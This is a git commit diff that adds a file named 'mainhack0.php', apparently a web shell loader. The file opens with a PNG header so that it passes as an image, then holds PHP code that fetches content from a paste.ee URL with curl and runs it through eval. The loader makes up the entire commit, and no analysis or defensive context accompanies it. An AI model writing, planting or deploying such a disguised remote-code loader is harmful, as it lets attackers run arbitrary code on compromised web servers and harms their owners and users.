5525d6d2ff6dbc4fb2891bd04c9b881996ab791d
conflicker1 <45840965+conflicker1@users.noreply.github.com>
2025-02-08 12:41:27 +0700

    Create mainhack0.php

---
+++ mainhack0.php
@@ -0,0 +1,5 @@
+‰PNG
+
+   
+
+<?php  $link = 'https://paste.ee/r/UZuxt'; $ch = curl_init();  curl_setopt($ch, CURLOPT_URL, $link); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  $output = curl_exec($ch);  curl_close($ch);       eval ('?>'.$output); ?>
